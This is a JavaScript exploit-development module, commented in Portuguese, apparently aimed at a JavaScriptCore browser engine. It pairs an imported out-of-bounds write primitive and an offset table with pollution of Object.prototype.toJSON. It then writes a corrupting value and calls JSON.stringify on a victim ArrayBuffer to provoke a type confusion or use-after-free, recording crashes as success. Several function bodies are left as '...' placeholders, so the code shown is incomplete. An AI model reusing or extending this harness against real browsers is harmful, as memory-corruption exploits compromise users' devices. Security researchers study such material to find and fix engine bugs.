// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

// Função interna que executa uma única combinação de teste
async function executeSingleJsonTCTest(
    description, // Adicionando uma descrição para o log
    corruption_offset, 
    value_to_write, 
    enable_pp, 
    attemptOOBWrite, // Novo parâmetro para controlar a escrita OOB
    skipOOBEnvironmentSetup, // Novo parâmetro para pular completamente o triggerOOB_primitive
    logFn = logS3
) {
    const FNAME_SINGLE_TEST = `executeSingleJsonTCTest<${description}>`;
    logFn(`--- Iniciando Teste Especulativo: ${description} ---`, "test", FNAME_SINGLE_TEST);
    logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, PP: ${enable_pp}, Escrita OOB: ${attemptOOBWrite}, Setup OOB: ${!skipOOBEnvironmentSetup}`, "info", FNAME_SINGLE_TEST);

    if (!skipOOBEnvironmentSetup) {
        await triggerOOB_primitive(); // Configura o ambiente OOB
        if (!oob_array_buffer_real) {
            logFn("Falha ao configurar ambiente OOB. Abortando este teste.", "error", FNAME_SINGLE_TEST);
            return false;
        }
    } else {
        logFn("Setup do ambiente OOB pulado para este teste.", "info", FNAME_SINGLE_TEST);
        // Garantir que o ambiente OOB esteja limpo se não for usado
        if (oob_array_buffer_real) clearOOBEnvironment();
    }


    let victim_ab_size = 64;
    let victim_ab = new ArrayBuffer(victim_ab_size);
    logFn(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_SINGLE_TEST);

    const ppKey = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionApplied = false;
    let testSucceededSpeculatively = false;

    try {
        if (enable_pp) {
            logFn(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME_SINGLE_TEST);
            Object.defineProperty(Object.prototype, ppKey, {
                value: function() {
                    // ... (código da função toJSON poluída - manter como estava, mas adicionar logs)
                    const currentOperationThis = this;
                    logFn(`[[[ ${ppKey} POLUÍDO INVOCADO ]]]`, 'vuln', FNAME_SINGLE_TEST); // Log de entrada
                    // ... (resto dos logs e lógica da função toJSON) ...
                    try {
                        // ... (acessos a currentOperationThis.byteLength, etc.)
                        logFn(`  [[[ ${ppKey} POLUÍDO FINALIZANDO NORMALMENTE ]]]`, 'info', FNAME_SINGLE_TEST);
                        return { toJSON_executed: true, /* ... */ };
                    } catch (e) {
                        logFn(`  [[[ ${ppKey} POLUÍDO ERRO INTERNO: ${e.message} ]]]`, 'critical', FNAME_SINGLE_TEST);
                        logFn(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Teste: ${description})`, "vuln", FNAME_SINGLE_TEST);
                        testSucceededSpeculatively = true;
                        return { toJSON_error: true, /* ... */ };
                    }
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logFn(`Object.prototype.${ppKey} poluído.`, "good", FNAME_SINGLE_TEST);
        } else {
            logFn(`Poluição de Object.prototype.${ppKey} DESABILITADA.`, "info", FNAME_SINGLE_TEST);
        }

        if (attemptOOBWrite && !skipOOBEnvironmentSetup && oob_array_buffer_real) {
            const bytes_to_write_for_corruption = 4;
            if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                logFn(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset absoluto ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_SINGLE_TEST);
                oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
            } else {
                logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} está fora dos limites de oob_array_buffer_real ou é negativo. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
            }
        } else if (attemptOOBWrite) {
            logFn(`AVISO: Escrita OOB solicitada, mas ambiente OOB não configurado ou buffer nulo. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
        }


        await PAUSE_S3(MEDIUM_PAUSE_S3);

        logFn(`>>> PRESTES A CHAMAR JSON.stringify(victim_ab) para teste: ${description}`, "info", FNAME_SINGLE_TEST);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(victim_ab); // PONTO CRÍTICO
            logFn(`<<< RETORNO JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_SINGLE_TEST);
            // ... (lógica de verificação do resultado como antes) ...
        } catch (e) {
            logFn(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME_SINGLE_TEST);
            logFn(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Teste: ${description})`, "vuln", FNAME_SINGLE_TEST);
            console.error(`JSON.stringify UAF/TC Test Error (${description}):`, e);
            testSucceededSpeculatively = true;
        }

    } catch (mainIterationError) {
        logFn(`Erro principal na iteração do teste (${description}): ${mainIterationError.message}`, "error", FNAME_SINGLE_TEST);
        console.error(mainIterationError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey];
            }
        }
        if (!skipOOBEnvironmentSetup && oob_array_buffer_real) {
            clearOOBEnvironment();
        }
    }
    logFn(`--- Teste Especulativo Concluído: ${description} (Sucesso Especulativo: ${testSucceededSpeculatively}) ---`, "test", FNAME_SINGLE_TEST);
    return testSucceededSpeculatively;
}

// Função exportada para rodar um teste específico
export async function runSpecificJsonTypeConfusionTest(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, skipOOBEnvSetup = false) {
    return await executeSingleJsonTCTest(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, skipOOBEnvSetup, logS3);
}

// Função original, agora serve como um loop de varredura mais amplo se chamada diretamente
export async function testJsonTypeConfusionUAFSpeculative() {
    // ... (esta função pode permanecer como um exemplo de varredura, ou você pode removê-la/adaptá-la
    // para chamar runSpecificJsonTypeConfusionTest com diferentes combinações em loop) ...
    logS3("Executando testJsonTypeConfusionUAFSpeculative (loop original) - considere usar runSpecificJsonTypeConfusionTest para testes focados.", "warn");
    // Exemplo: replicando o crash original
    await runSpecificJsonTypeConfusionTest("ScanOriginalCrash", 0x70, 0xFFFFFFFF, true, true, false);
}
